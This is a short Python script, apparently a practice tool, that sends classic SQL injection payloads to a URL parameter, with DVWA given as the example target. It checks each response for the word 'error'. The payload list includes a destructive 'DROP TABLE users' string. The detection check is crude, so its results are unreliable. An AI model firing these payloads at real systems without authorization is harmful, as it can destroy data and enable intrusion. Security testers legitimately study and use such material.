import requests

def test_sql_injection(url, parameter):
    # Define SQL injection payloads to test
    payloads = ["' OR 1=1 --", "'; DROP TABLE users; --", "1' or '1' = '1'"]

    for payload in payloads:
        # Craft the URL with the payload in the parameter
        test_url = f"{url}?{parameter}={payload}"

        # Send a GET request to the URL
        response = requests.get(test_url)

        # Check the response for potential SQL injection indications
        if "error" in response.text.lower():
            print(f"Potential SQL Injection Detected with payload: {payload}")
        else:
            print(f"No SQL Injection Detected with payload: {payload}")

# Example URL and parameter to test (replace with your target)
target_url = "https://DVWA.com/page"
target_parameter = "id"

# Call the function with the target URL and parameter
test_sql_injection(target_url, target_parameter)
